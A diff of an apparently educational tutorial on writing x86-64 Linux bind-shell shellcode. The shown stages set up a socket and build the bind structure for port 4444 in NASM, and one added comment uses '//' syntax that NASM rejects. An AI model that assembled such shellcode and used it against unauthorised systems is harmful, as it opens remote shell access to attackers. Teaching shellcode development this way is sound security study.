@@ -134,18 +134,54 @@ mov rax, 41 ;Syscall number for socket
 mov rdi, 2 ;Value for AF_INET
 mov rsi, 1 ;Value for SOCK_STREAM
 mov rdx, 0 ;Third argument where we need to pass a 0
-syscall
+syscall //Give the syscall instruction
 ```
 
 If the above code block does not make sense, please review the "What are syscalls section".
 
 <h3>Stage 2 - Binding the newly created socket to a port</h3>
 
+So remember that the return value from a syscall instruction will be saved in RAX and most of the subsequent instructions require "sock" as the first argument. So for this purpose, we will move the value inside RAX to RDI for use as the first argument in later syscall instructions.
+
+```nasm
+mov rdi, rax
+```
+
+Next up is setting up the Data Structure that we need for the bind syscall. We will make use of the Stack for this and remember that the Stack is LIFO, so we need to start with the last argument first. We do need to figure out what to pass as arguments for INADDR_ANY and the port to bind to. We need to hardcode the port in this case as there is no opportunity to pass arguments to your shellcode. So once again Python to the rescue.
+
+```python
+Python 2.7.15+ (default, Jul  9 2019, 16:51:35)
+[GCC 7.4.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import socket
+>>> socket.INADDR_ANY
+0
+>>> socket.htons(4444)
+23569 # value of 4444 in byte order
+>>> hex(socket.htons(4444))
+'0x5c11' 
+>>>
+```
+
+So it seems that we need to pass 0 for INADDR_ANY and the hex value of the byte order of port 4444 is 0x5c11.
+
 ```c
 server.sin_family = AF_INET;
 server.sin_port = htons(atoi(arguments[2]));
 server.sin_addr.s_addr = INADDR_ANY;
 bzero(&server.sin_zero, 8);
-        
+```
+
+```nasm
+xor rax, rax ;zero out the rax register
+
+push rax ;push the 8 zero bytes in rax to the stack for bzero
+mov dword [rsp-4], eax ; move 4 bytes (because eax is the 32-bit part of rax) of 0's onto the stack at stack pointer - 4 bytes
+mov word [rsp-6], 0x5c11 ; move the port value onto the stack - 2 bytes
+mov word [rsp-8], 0x2 ;move the value 2 (for AF_INET) on the stack at stack pointer - 8 bytes
+sub rsp, 8 ;adjust the stack pointer by 8 bytes for the above 3 commands so that RSP points to the beginning of our Data Structure
+```
+
+```c 
 bind(sock, (struct sockaddr *)&server, sockaddr_len);
 ```
